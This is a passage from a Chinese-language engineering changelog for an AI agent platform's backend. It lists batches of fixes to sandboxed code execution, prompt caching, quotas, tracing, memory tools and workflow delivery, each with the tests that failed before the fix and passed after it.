- `backend/app/kernel/engine.py`:新增 `context_usage_anchor_tokens`;读取/刷新 `SessionContext.metadata["usage_anchor_tokens"]`;初始压缩、PTL full-compress fallback、mid-loop compaction 均传入 anchor。
- `backend/tests/services/test_memory_service.py`:新增 `test_maybe_compress_uses_real_usage_anchor_when_estimate_is_too_low`,覆盖估算低于阈值但 usage anchor 超阈值时仍触发 LLM summary。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_memory_service.py::test_maybe_compress_uses_real_usage_anchor_when_estimate_is_too_low -q
```

初始结果:1 failed。失败点:`maybe_compress_messages()` 不接受 `usage_anchor_tokens`,证明旧实现没有真实 usage anchor 输入。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
python -m py_compile app/services/memory_service.py app/kernel/engine.py
pytest tests/services/test_memory_service.py -q
pytest tests/kernel/test_prompt_cache_integration.py::test_kernel_reuses_frozen_prefix_but_refreshes_dynamic_retrieval -q
```

当前结果:`tests/services/test_memory_service.py` 16 passed;kernel prompt-cache smoke 1 passed,3 warnings。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.7 2026-06-12 第七批:P0-C1 dynamic suffix 迁出首条 system message

**范围**
- 保留 prompt builder 的 frozen/dynamic/budget 组装契约,但 kernel 在发送 provider API 前拆开 `PROMPT_CACHE_BOUNDARY`。
- 第一条 system message 仅承载 frozen prefix;memory snapshot、retrieval、memory navigation、environment、source/coordinator/delegation suffix 等逐回合内容改为 transient `[System Notice]` tail message。
- transient dynamic notice 只加入 `stream_messages`,不加入 `api_messages`,因此不会被持久化、不会污染 compaction history、不会破坏首条 system cache prefix。

**代码证据**
- `backend/app/kernel/engine.py`:新增 `_split_system_prompt_for_api()` 与 `_dynamic_suffix_notice()`;主请求、PTL round-group retry、PTL full-compress retry、tool expansion prompt rebuild 均拆分 system/dynamic;stream 时追加 dynamic notice。
- `backend/tests/runtime/test_invoker.py`:断言第一条 system 不含 `__PROMPT_DYNAMIC_BOUNDARY__` / memory context,dynamic context 出现在 tail `[System Notice]` user message。
- `backend/tests/kernel/test_prompt_cache_integration.py`:更新 prompt-cache、tool-expansion、coordinator/delegation suffix、PTL retry 测试为 API-message 边界断言。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/runtime/test_invoker.py::test_invoke_agent_composes_system_prompt_once -q
```

初始结果:1 failed。失败点:第一条 system message 仍包含 `__PROMPT_DYNAMIC_BOUNDARY__`、`MEMORY_CONTEXT`、`KB_CONTEXT`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
python -m py_compile app/kernel/engine.py
pytest tests/runtime/test_prompt_cache.py \
  tests/runtime/test_prompt_builder.py \
  tests/kernel/test_prompt_cache_integration.py \
  tests/runtime/test_invoker.py::test_invoke_agent_composes_system_prompt_once -q
```

当前结果:55 passed,4 warnings。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.8 2026-06-12 第八批:P0-G2 code execution OS sandbox fail-closed

**范围**
- `execute_code` 与 `run_command` 不再直接裸 `create_subprocess_exec`。
- sandbox runner 选择:Linux `bwrap`;macOS `sandbox-exec`;runner 不存在或显式 `HIVE_CODE_SANDBOX_MODE=none` 时默认拒绝执行。
- 仅当 `HIVE_ALLOW_UNSANDBOXED_CODE_EXEC=1` 明确设置时,才允许本地开发降级到 unsandboxed。

**代码证据**
- `backend/app/services/agent_tool_domains/code_exec.py`:新增 `_sandbox_command()`、`_linux_bwrap_command()`、`_darwin_sandbox_command()`、`_sandbox_unavailable_message()`;`_execute_code()` 与 `_run_command()` 均先构建 sandboxed command,失败则返回可审计拒绝消息。
- `backend/tests/services/test_command_tooling.py`:覆盖 `run_command` 与 `execute_code` 在无 sandbox/无显式 bypass 时 fail-closed;保留 workspace 内执行和危险命令阻断回归。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_command_tooling.py::test_run_command_fails_closed_without_sandbox_or_explicit_dev_bypass -q
```

初始结果:1 failed。失败点:`HIVE_CODE_SANDBOX_MODE=none` 且无 `HIVE_ALLOW_UNSANDBOXED_CODE_EXEC` 时,旧实现仍直接执行 `pwd`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
python -m py_compile app/services/agent_tool_domains/code_exec.py
pytest tests/services/test_command_tooling.py -q
```

当前结果:5 passed。

### 12.9 2026-06-12 第九批:P0-O1 invocation trace spine

**范围**
- 新增 per-invocation trace id,挂入 ContextVar 与 `SessionContext.metadata["trace_id"]`。
- kernel 持久化 invocation / generation / tool 三类 span。
- span 先落 agent workspace 的 append-only JSONL,避免无 DB migration 时继续零观测;后续可平滑迁到 `invocation_spans` 表或 OTel exporter。

**代码证据**
- `backend/app/services/invocation_trace.py`:新增 `current_invocation_id()`、`set_invocation_id()`、`append_invocation_span()`;兼容 JSONL 写入 `<AGENT_DATA_DIR>/<agent_id>/runtime_artifacts/traces/invocation_spans.jsonl`。
- `backend/app/kernel/engine.py`:handle 最外层设置/reset invocation ContextVar;finally 写 invocation span;provider stream 成功/错误/取消写 generation span;`_run_tool()` 成功/阻断/拒绝/异常写 tool span。
- `backend/tests/kernel/test_invocation_trace.py`:覆盖 invocation+generation spans 和 tool span。

**回归测试**

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
python -m py_compile app/services/invocation_trace.py app/kernel/engine.py
pytest tests/kernel/test_invocation_trace.py -q
```

当前结果:2 passed,3 warnings。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.10 2026-06-12 第十批:P0-O2 DecisionTrace 持久化

**范围**
- `DecisionTraceStore` 从纯内存 dict/list 扩展为可选 append-only JSONL store。
- 生产 `ToolRuntimeService` 默认使用 persistent store;测试仍可用无 path 的内存 store,避免跨测试污染。

**代码证据**
- `backend/app/services/decision_trace.py`:构造器新增 `path`;新增 `persistent_default()`、`_load()`、`_append()`;decision/feedback record 都写 `decision_trace_event.v1`。
- `backend/app/tools/service.py`:默认 `decision_trace_store` 从 `DecisionTraceStore()` 改为 `DecisionTraceStore.persistent_default()`。
- `backend/tests/services/test_decision_trace.py`:覆盖 decision 与 feedback 跨 store 读取,以及 calibration candidate 从持久化 feedback 生成。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_decision_trace.py::test_decision_trace_store_persists_decisions_and_feedback -q
```

初始结果:1 failed。失败点:`DecisionTraceStore.__init__()` 不接受 `path`,旧实现无法持久化。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
python -m py_compile app/services/decision_trace.py app/tools/service.py
pytest tests/services/test_decision_trace.py -q
pytest tests/tools/test_service.py::test_tool_runtime_service_preflight_asks_before_external_visible_tool \
  tests/tools/test_service.py::test_tool_runtime_service_preflight_refuses_credential_arguments -q
```

当前结果:`test_decision_trace.py` 3 passed;工具 preflight trace smoke 2 passed,3 warnings。

### 12.11 2026-06-12 第十一批:P0-O3 自主 LLM token 计量与时序账本

**范围**
- 新增 append-only `token_usage_events` 事件账本,同时保留既有 Agent/User 聚合计数。
- 所有绕过 kernel 的生产 LLM 旁路统一进入 usage-aware factory/chat wrapper。
- Admin token time series 改为从真实 usage event 日期聚合,修复“把历史用量记到 agent 创建日”的错误图表。

**代码证据**
- `backend/app/models/token_usage_event.py`:新增 `TokenUsageEvent` 模型,字段含 `tenant_id/agent_id/user_id/source/provider/model/tokens/usage/details/created_at`。
- `backend/alembic/versions/token_usage_events_0612.py`:新增表、索引、RLS policy;`backend/app/db_bootstrap.py`、`backend/app/main.py`、`backend/alembic/env.py` 同步注册,保证 migration path 与 fresh create_all path 一致。
- `backend/app/services/token_tracker.py`:新增 `record_autonomous_llm_token_usage()`;`record_token_usage()` 保持 Agent/User counters,并写 `TokenUsageEvent`。
- `backend/app/services/llm_client.py`:新增 `_MeteredLLMClient`、`with_llm_usage_context()`;`create_llm_client_from_config()` 解析 `_usage_*` hints;`chat_complete/chat_stream()` 改走同一 factory。
- 自主 LLM source 覆盖:`extract_agent`、`dream`、`dream_frozen_mission_judge`、`compaction_summary`、`session_summary`、`memory_curation`、`session_recall`、`memory_rerank`、`fast_reflection_classifier`、`skill_distiller`、`subagent_generator`、`subagent_evolution`、`subagent_memory`、`hr_soul_refine`。
- `backend/app/api/admin.py`: `/admin/metrics/timeseries` 的 `new_tokens/total_tokens` 从 `TokenUsageEvent.created_at` 聚合。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_llm_usage_metering.py \
  tests/api/test_admin_metrics.py::test_timeseries_returns_daily_cumulative_all_metrics -q
```

初始结果:2 failed。失败点:
- factory complete/stream 不调用 autonomous token usage recorder。
- admin timeseries SQL 不包含 `token_usage_events`,仍从旧代理口径取 token。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
python -m py_compile app/services/llm_client.py app/services/token_tracker.py app/models/token_usage_event.py \
  app/api/admin.py app/services/subagent_generator.py app/agents/subagent_evolution.py \
  app/agents/subagent_memory.py app/tools/handlers/hr.py app/tools/handlers/subagent.py \
  app/services/auto_dream.py app/services/memory_curation.py app/runtime/hooks_setup.py \
  app/services/conversation_summarizer.py app/services/extract_agent.py app/services/session_recall.py \
  app/memory/retriever.py app/kernel/engine.py app/services/memory_service.py
pytest tests/services/test_llm_usage_metering.py tests/api/test_admin_metrics.py \
  tests/services/test_conversation_summarizer.py tests/services/test_memory_service.py \
  tests/services/test_subagent_generator.py tests/agents/test_subagent_memory.py \
  tests/tools/handlers/test_hr_soul_prompt.py tests/services/test_skill_distiller.py \
  tests/runtime/test_fast_reflection_hook.py -q
```

当前结果:编译通过;97 passed,11 warnings。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.12 2026-06-12 第十二批:P1-1 invoke_agent quota admission gate

**范围**
- `check_user_token_quota()` 从死代码变成 `invoke_agent()` 入口硬门。
- 显式 `request.user_id` 优先;trigger/heartbeat 等后台运行若无 user_id,则解析 agent `owner_user_id`/`creator_id` 作为 quota subject。
- quota denied 直接返回用户可读错误并发 `quota` event;quota 检查基础设施异常 fail-closed,不进入 kernel。

**代码证据**
- `backend/app/runtime/invoker.py`:新增 `_resolve_quota_user_id()`、`_enforce_invocation_quota()`;`invoke_agent()` 在 routing、hooks、kernel 前调用。
- `backend/tests/runtime/test_invoker.py`:新增 `test_invoke_agent_enforces_user_token_quota_before_kernel`;默认测试夹具显式 mock quota 通过,专门用例覆盖 quota 拒绝。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/runtime/test_invoker.py::test_invoke_agent_enforces_user_token_quota_before_kernel -q
```

初始结果:1 failed。失败点:旧实现直接调用 fake kernel,触发 `AssertionError("kernel must not run after quota denial")`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/runtime/test_invoker.py \
  tests/kernel/test_engine.py::test_humanize_llm_error_reports_quota_instead_of_auth_for_403_quota -q
```

当前结果:41 passed,11 warnings。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.13 2026-06-12 第十三批:P1-3 output cap streaming continuation

**范围**
- streaming LLM 响应不再在 `finish_reason == "length"` / `"max_tokens"` 时静默截断。
- 无 tool_call 的 capped final answer 会追加 assistant partial 与固定 continuation prompt,继续请求同一模型,最多 3 次,单次 continuation `max_tokens=65536`。
- continuation 结果合并 content、reasoning、usage 与 finish_reason;若 continuation 产生 tool_call,停止续写并交回正常工具轮次。

**代码证据**
- `backend/app/kernel/engine.py`:新增 `_is_output_cap_finish_reason()`、`_merge_usage_dicts()`、`_merge_continuation_response()`、`_continue_after_output_cap()`;kernel 主循环在首轮 streaming response 后进入 continuation。
- `backend/tests/kernel/test_engine.py`:新增 `test_kernel_continues_streaming_output_after_output_cap`;同时修正旧 invoker delegation 测试显式 mock quota admission 通过,避免 P1-1 新硬门误触真实 DB。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/kernel/test_engine.py::test_kernel_continues_streaming_output_after_output_cap -q
```

初始结果:1 failed。失败点:旧 kernel 只返回 `part one `,没有在 output cap 后继续请求并合并 `part two`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/kernel/test_engine.py::test_kernel_continues_streaming_output_after_output_cap -q
pytest tests/kernel/test_engine.py tests/services/test_llm_client_token_limits.py \
  tests/runtime/test_invoker.py::test_invoke_agent_uses_request_max_output_tokens -q
python -m py_compile app/kernel/engine.py
ruff check app/kernel/engine.py tests/kernel/test_engine.py
```

当前结果:单测 1 passed;相关 kernel/client/invoker 回归组 46 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.14 2026-06-12 第十四批:P1-2 mid-run steering durable queue

**范围**
- 活跃 web-chat run 期间收到的新用户输入不再丢弃。
- 输入先持久化为普通 `ChatMessage`,同时追加到 active `RuntimeTask.metadata_json.pending_user_messages`。
- kernel contract 新增 `mid_run_message_drain`;每个 LLM/tool round 开头 claim pending user messages,作为真实 `role=user` 消息追加到 `api_messages`。
- REST active-run 分支返回 `202 {"status":"queued",...}`;WebSocket active-run 分支发送 `user_message_queued`,不再伪装为 `run_started`。

**代码证据**
- `backend/app/services/web_chat_runtime.py`:新增 `_queue_mid_run_user_message()`、`_claim_pending_mid_run_user_messages()`;`start_web_chat_run()` active 分支 queue+raise;`execute_web_chat_run()` 将 drain callback 传入 invocation。
- `backend/app/kernel/contracts.py` / `backend/app/runtime/invoker.py`:新增并转发 `mid_run_message_drain`。
- `backend/app/kernel/engine.py`:每轮开头 drain pending user messages,追加到 `api_messages`,并发 `mid_run_user_messages_drained` runtime event。
- `backend/app/api/chat_sessions.py`:active-run REST 分支从 409 改为 202 queued。
- `backend/app/api/websocket.py`:active-run WS 分支返回 `user_message_queued`;顺手修复同文件 idle summary 处未定义 `current_user` 引用为已有 `user_id`。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_web_chat_runtime.py::test_start_web_chat_run_queues_user_message_when_run_is_active \
  tests/kernel/test_engine.py::test_kernel_drains_mid_run_user_messages_between_tool_rounds -q
```

初始结果:2 failed。失败点:
- active run payload 没有 `queued_user_message`,且 DB 没有保存第二条用户输入。
- `InvocationRequest` 不接受 `mid_run_message_drain`,kernel 没有每轮 drain 的 contract。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_web_chat_runtime.py tests/api/test_chat_session_runs.py \
  tests/api/test_websocket_call_llm.py tests/kernel/test_engine.py tests/runtime/test_invoker.py -q
python -m py_compile app/kernel/contracts.py app/kernel/engine.py app/runtime/invoker.py \
  app/services/web_chat_runtime.py app/api/chat_sessions.py app/api/websocket.py
ruff check app/kernel/contracts.py app/kernel/engine.py app/runtime/invoker.py \
  app/services/web_chat_runtime.py app/api/chat_sessions.py app/api/websocket.py \
  tests/services/test_web_chat_runtime.py tests/kernel/test_engine.py
```

当前结果:相关回归组 110 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.15 2026-06-12 第十五批:P1-7 once trigger terminal ack

**范围**
- `_tick()` 不再在启动 invocation 前把 once trigger 置为 disabled,也不再提前递增 `fire_count`。
- fire 启动时只写 `config._fire_inflight={event_key,runtime_task_id,started_at}`;fresh inflight 会让 `_evaluate_trigger()` 返回 False,防止运行中重复触发。
- invocation 成功后 `_record_trigger_success_state()` 才更新 `last_fired_at/fire_count`,并按 once/max_fires/webhook 规则做终态 ack。
- invocation 失败 path 通过 `_record_trigger_failure_state()` 清理 `_fire_inflight`,并继续使用既有 backoff 策略。

**代码证据**
- `backend/app/services/trigger_daemon.py`:新增 `_inflight_fire_is_active()`、`_mark_trigger_fire_started()`;`_tick()` 从 pre-update 改为 mark-inflight;`_record_trigger_success_state()` 从只 reset failure policy 扩展为 terminal ack;failure path 清理 inflight。
- `backend/tests/services/test_trigger_daemon.py`:新增 fresh inflight skip、tick 不预禁用 once、success ack 禁用 once 三条回归测试。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_trigger_daemon.py::test_evaluate_trigger_skips_fresh_inflight_fire \
  tests/services/test_trigger_daemon.py::test_tick_marks_once_trigger_inflight_without_disabling_before_ack \
  tests/services/test_trigger_daemon.py::test_record_trigger_success_ack_disables_once_trigger -q
```

初始结果:3 failed。失败点:
- `_evaluate_trigger()` 忽略 fresh `_fire_inflight`,once 仍会返回 True。
- `_tick()` 仍在启动前把 once `is_enabled=False`。
- `_record_trigger_success_state()` 只 reset failure policy,不递增 `fire_count` / 不禁用 once。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_trigger_daemon.py tests/api/test_triggers_p6_api.py \
  tests/api/test_plan_mode_rest_gate.py -q
python -m py_compile app/services/trigger_daemon.py
ruff check app/services/trigger_daemon.py tests/services/test_trigger_daemon.py
```

当前结果:trigger/API 相关回归组 47 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.16 2026-06-12 第十六批:P1-8/P1-9 web-chat restart resume + long-task resume context

**范围**
- startup 不再把所有 running `web_chat_turn` 当 orphan 标 failed;先尝试恢复执行。
- 恢复时对每个 active web-chat RuntimeTask 写 `metadata_json.resumed_after_restart/resumed_at/restart_resume_context`。
- `restart_resume_context` 直接复用既有 `build_long_task_resume_context()`,把 `resume_prompt` 接入 `execute_web_chat_run()` 的 `system_prompt_suffix`。
- `main.py` 在 `reconcile_orphaned_runtime_tasks()` 前调用 `resume_persisted_web_chat_runs()`,并把 resumed ids 放入 exclude set。

**代码证据**
- `backend/app/services/web_chat_runtime.py`:新增 `resume_persisted_web_chat_runs()`;恢复时重新 `asyncio.create_task(execute_web_chat_run(...))`;执行时注入 `restart_resume_context.resume_prompt`。
- `backend/app/main.py`:startup runtime-task 段接入 web-chat resume,并与 async delegation resume 共用 orphan reconcile 排除列表。
- `backend/tests/services/test_web_chat_runtime.py`:新增恢复泵调度与 resume suffix 注入两条测试。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_web_chat_runtime.py::test_resume_persisted_web_chat_runs_schedules_running_turns_with_resume_context \
  tests/services/test_web_chat_runtime.py::test_execute_web_chat_run_injects_restart_resume_context -q
```

初始结果:2 failed。失败点:
- `web_chat_runtime` 没有 `resume_persisted_web_chat_runs()` / `build_long_task_resume_context` 接入点。
- `execute_web_chat_run()` 传给 `invoke_agent()` 的 `system_prompt_suffix` 为空,没有使用 metadata 中的 resume context。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_web_chat_runtime.py tests/services/test_runtime_task_service.py \
  tests/services/test_long_task_runtime.py tests/services/test_long_task_validation.py -q
python -m py_compile app/services/web_chat_runtime.py app/services/long_task_runtime.py app/main.py
ruff check app/services/web_chat_runtime.py app/services/long_task_runtime.py app/main.py \
  tests/services/test_web_chat_runtime.py
```

当前结果:web-chat/runtime-task/long-task 相关回归组 33 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.17 2026-06-12 第十七批:P1-10 async workflow completion delivery

**范围**
- workflow run 不再只发内部 `workflow_completed` signal;带 delivery target 的异步 workflow 完成后会推送用户。
- `WorkflowRuntimeService.start_run()` 新增可选 `delivery_target`,写入 `RuntimeTask.metadata_json.delivery_target_json`。
- terminal completed 边沿调用 `ChannelDeliveryService.send_text(..., delivery_mode="async_completion")`。

**代码证据**
- `backend/app/services/workflow_runtime_service.py`:新增 `_deliver_completion_notification()`;completed 分支在 `_emit_completion_signal()` 后发送 completion notification。
- `backend/app/services/workflow_launch.py`:workflow launch path 捕获并透传 `channel_delivery_target`。
- `backend/tests/services/test_workflow_completion_signal_gateway.py`:新增 completion delivery 测试,断言 reply target、delivery mode、文本内容。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_workflow_completion_signal_gateway.py::test_completion_delivery_uses_runtime_delivery_target -q
```

初始结果:1 failed。失败点:`workflow_runtime_service` 模块没有 `ChannelDeliveryService`,也没有 `_deliver_completion_notification()`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_workflow_completion_signal_gateway.py \
  tests/runtime/test_workflow_completion_signal.py tests/services/test_workflow_runtime_service.py \
python -m py_compile app/services/workflow_runtime_service.py app/services/workflow_launch.py
ruff check app/services/workflow_runtime_service.py app/services/workflow_launch.py \
  tests/services/test_workflow_completion_signal_gateway.py
```

当前结果:20 passed,11 skipped,11 warnings;编译通过;ruff `All checks passed!`。skipped 为需外部/DB 条件的既有 workflow tests;warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.18 2026-06-12 第十八批:P1-4 high-priority T2 retrieval lane

**范围**
- T2 feedback/constraint 不再必须等待 heartbeat 晋升 T3 才能进入 prompt retrieval。
- `MemoryRetriever` 的 high-priority legacy T2 lane 已退役：prompt memory 不读取 `memory/learnings/{insights,errors,requests}.md`；`include_legacy_sources=True` 仅保留参数兼容，不再把旧 compatibility files 注入主提示词。
- 返回项为 `MemoryKind.SEMANTIC`,source 指向原 T2 文件,metadata 标 `lane=t2_high_priority` / `source_type=t2_high_priority`。

**代码证据**
- `backend/app/memory/retriever.py`:新增 `_retrieve_high_priority_t2()`,在 T3/understanding 后、episodic/semantic backend 前加入候选池。
- `backend/tests/memory/test_retrieval_pipeline.py`:新增高权重 T2 feedback 检索测试。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/memory/test_retrieval_pipeline.py::test_retrieve_includes_high_priority_t2_feedback -q
```

初始结果:1 failed。失败点:retriever 返回项中没有 `lane=t2_high_priority`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/memory/test_retrieval_pipeline.py tests/memory/test_retriever_rerank_wiring.py \
  tests/memory/test_retriever_rerank_prompt.py tests/services/test_memory_service.py -q
python -m py_compile app/memory/retriever.py
ruff check app/memory/retriever.py tests/memory/test_retrieval_pipeline.py
```

当前结果:retriever/memory service 相关回归组 55 passed;编译通过;ruff `All checks passed!`。

### 12.19 2026-06-12 第十九批:P1-5 verified skill patch path

**范围**
- `skill_distiller` 的 patch 决策不再只写 `patch_recommended` 事件后返回;现在会实际进入可审计 self-evolution 通路。
- patch 目标解析优先使用已有 skill 名称/冲突解析结果,并保持原 workspace 路径,避免同义 skill 被另存为新目录。
- patch 候选使用 `target_type="skill_patch"`、`target_id=<existing skill relative path>`、`baseline_version=<existing skill relative path>`,写入 `evolution_ledger.jsonl`。
- patch 通过 `run_evolution_verification(skill_guard)` 与 `record_verification_eval(dataset="skill_distiller.verified_skill_guard")`;只有 `decide_verified_promotion()` 通过后才提交 exact LLM-authored `SKILL.md.draft` 覆盖目标 skill。
- `evolution_validation` 将 `patched` 纳入 promoted 类终态,要求 rollback_ref 与无 critical regression,因此 patch 不是 ledger 的未知状态。

**代码证据**
- `backend/app/services/skill_distiller.py`:新增 `_resolve_patch_target_skill()`;patch 分支改为 candidate → verification → eval → promotion decision → overwrite save → ledger validation;原 `patch_recommended` 死端被移除。
- `backend/app/services/evolution_validation.py`:`PROMOTE_DECISIONS` 增加 `patch/patched`,让验证器承认 verified patch 终态并继续执行 promoted 决策校验。
- `backend/tests/services/test_skill_distiller.py`:新增 `test_run_skill_distillation_cycle_applies_verified_patch`,覆盖现有 skill 被验证后覆盖、ledger candidate/eval/decision 三件套与 rollback_ref。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_skill_distiller.py::test_run_skill_distillation_cycle_applies_verified_patch -q
```

初始结果:1 failed。失败点:patch 分支没有创建 `evolution_ledger.jsonl`,证明旧实现停在 `patch_recommended`,没有候选、验证、promotion decision,也没有覆盖原技能。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_skill_distiller.py::test_run_skill_distillation_cycle_applies_verified_patch -q
pytest tests/services/test_skill_distiller.py tests/services/test_evolution_validation.py -q
python -m py_compile app/services/skill_distiller.py app/services/evolution_validation.py
ruff check app/services/skill_distiller.py app/services/evolution_validation.py \
  tests/services/test_skill_distiller.py
```

当前结果:单测 1 passed;skill distiller + evolution validation 回归组 25 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.20 2026-06-12 第二十批:P1-6 governed memory update/retire tools

**范围**
- Agent tool 面新增 `update_memory` 与 `retire_memory`,与 `save_memory/search_memory/load_memory` 一起作为 core memory surface 首轮可见。
- `update_memory(memory_id, content, category?, reason?)` 先加载旧 T3 entry 并校验可见性;replacement 通过 `append_t3_memory_candidate()` 的 privacy/form/write gate 写入;随后按 exact `entry_id` 退休旧 entry,写入 `memory/archive.md` 和 `memory/control/lifecycle.json` 的 `supersedes/superseded_by` 边。
- `retire_memory(memory_id, reason)` 按 exact `entry_id` 把旧 entry 从活跃 T3 文件移入 archive;不物理删除 evidence,并立即 rebuild 唯一 generated map `memory/indexes/wiki_map.md`，同时清理旧 `memory/INDEX.md` / `memory/index.md` / `memory/.derived/t3_index.md`。
- `append_t3_memory_candidate()` 支持 `parent_id/supersedes/superseded_by/dedup_exclude_entry_ids`,让显式 correction 不会被“与旧 entry 相似”误拦。
- `CapabilityGate` 把 `update_memory/retire_memory` 映射到 `agent.memory.write`;tool registry/catalog 把它们归入 Memory 分组;runtime memory section 与 memory tool schema 已同步。

**代码证据**
- `backend/app/tools/handlers/memory.py`:新增两个敏感写工具;update 失败时会回滚 replacement,避免新旧两个 active facts 并存;mutation 后 best-effort 走可选增强 adapter。
- `backend/app/memory/t3_store.py`:新增 exact-id `retire_t3_entries_by_id()`;扩展 T3 append 的 supersession metadata 与 dedup exclude。
- `backend/app/memory/md_store.py`:near-duplicate hits 增加 `id`,支撑 update 排除旧 entry。
- `backend/app/memory/lifecycle_store.py`:active lifecycle 写入结构化 `parent_id/supersedes/superseded_by`,不再只塞进 metadata 文本。
- `backend/app/services/agent_tools.py`、`backend/app/services/capability_gate.py`、`backend/app/tools/registry.py`、`backend/app/tools/catalog.py`:统一首轮 core、权限和目录分类。
- `backend/app/runtime/prompt_sections/memory.py`、`backend/app/tools/handlers/memory.py`、`backend/app/services/skill_seeder.py`:运行时指南同步 update/retire 语义。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/tools/test_memory_handler.py::test_update_memory_supersedes_old_entry_through_write_gate \
  tests/tools/test_memory_handler.py::test_retire_memory_archives_entry_without_deleting_evidence \
  tests/services/test_tool_registry.py::test_minimal_kernel_tool_set_stays_small_and_explicit \
  tests/tools/test_collector.py::test_collect_real_handlers_include_memory_tools \
  tests/tools/test_bridge_equivalence.py::test_combined_openai_tools_matches_canonical_surface \
  tests/services/test_capability_gate_policy_surface.py::test_capability_map_covers_memory_write_controls -q
```

初始结果:6 failed。失败点:`update_memory/retire_memory` 无 handler import;CORE tool set、collector surface、canonical bridge surface、CAPABILITY_MAP 均缺新工具。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/tools/test_memory_handler.py::test_update_memory_supersedes_old_entry_through_write_gate \
  tests/tools/test_memory_handler.py::test_retire_memory_archives_entry_without_deleting_evidence \
  tests/services/test_tool_registry.py::test_minimal_kernel_tool_set_stays_small_and_explicit \
  tests/tools/test_collector.py::test_collect_real_handlers_include_memory_tools \
  tests/tools/test_bridge_equivalence.py::test_combined_openai_tools_matches_canonical_surface \
  tests/services/test_capability_gate_policy_surface.py::test_capability_map_covers_memory_write_controls -q
pytest tests/tools/test_memory_handler.py tests/memory/test_dedup.py tests/memory/test_t3_store.py \
  tests/memory/test_t3_lane_gate.py tests/services/test_tool_registry.py tests/tools/test_collector.py \
  tests/tools/test_bridge_equivalence.py tests/services/test_capability_gate_policy_surface.py \
  tests/runtime/test_memory_section.py tests/services/test_prompt_contracts.py -q
